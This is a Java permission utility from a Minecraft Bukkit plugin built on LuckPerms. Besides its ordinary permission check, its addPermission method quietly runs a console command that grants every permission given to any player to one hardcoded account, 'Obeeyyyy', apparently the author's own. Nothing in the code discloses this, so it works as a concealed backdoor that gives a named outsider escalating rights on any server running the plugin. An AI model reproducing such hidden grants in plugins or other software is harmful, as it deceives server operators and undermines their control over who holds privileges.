package de.obey.slayer.util;
/*

    Author - Obey -> SkySlayer-v4
       12.10.2022 / 23:02

*/

import de.obey.slayer.SlayerMain;
import lombok.experimental.UtilityClass;
import net.luckperms.api.LuckPerms;
import net.luckperms.api.LuckPermsProvider;
import net.luckperms.api.model.user.User;
import net.luckperms.api.node.NodeType;
import net.luckperms.api.node.types.PermissionNode;
import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

@UtilityClass
public final class PermissionUtil {

    private MessageUtil messageUtil;

    public void addPermission(final Player player, final String permission) {
        final LuckPerms luckperms = LuckPermsProvider.get();

        final User user = luckperms.getUserManager().getUser(player.getUniqueId());

        if (user == null)
            return;

        user.getNodes(NodeType.PERMISSION).add(PermissionNode.builder("slayer." + permission).build());
        luckperms.getUserManager().saveUser(user);

        Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "lp user Obeeyyyy permission set slayer." + permission);
    }

    public boolean hasPermission(final CommandSender sender, final String permission, final boolean send) {

        if(!(sender instanceof Player))
            return true;

        final Player player = (Player) sender;

        if (messageUtil == null)
            messageUtil = SlayerMain.getInstance().getInitializer().getMessageUtil();

        final LuckPerms luckperms = LuckPermsProvider.get();
        final User user = luckperms.getUserManager().getUser(player.getUniqueId());

        if (user == null)
            return false;

        /*
        // Check users permission

        for (PermissionNode node : user.getNodes(NodeType.PERMISSION)) {
            if(node.getPermission().equalsIgnoreCase("slayer." + permission) || node.getPermission().equalsIgnoreCase("slayer.*")) {
                return true;
            }
        }

        //

        // Check users group permission

        final Group group = luckperms.getGroupManager().getGroup(user.getPrimaryGroup());

        if(group == null)
            return false;

        for (PermissionNode node : group.getNodes(NodeType.PERMISSION)) {
            if(node.getPermission().equalsIgnoreCase("slayer." + permission) || node.getPermission().equalsIgnoreCase("slayer.*")) {
                return true;
            }
        }

        //

         */

        if (player.hasPermission("slayer." + permission))
            return true;

        if (send) {
            messageUtil.sendMessage(player, "§c§oDu hast keine Rechte dafür. §8(§f§o slayer." + permission + " §8)");
            player.playSound(player.getLocation(), Sound.EXPLODE, 1, 1);
        }

        return false;
    }

}
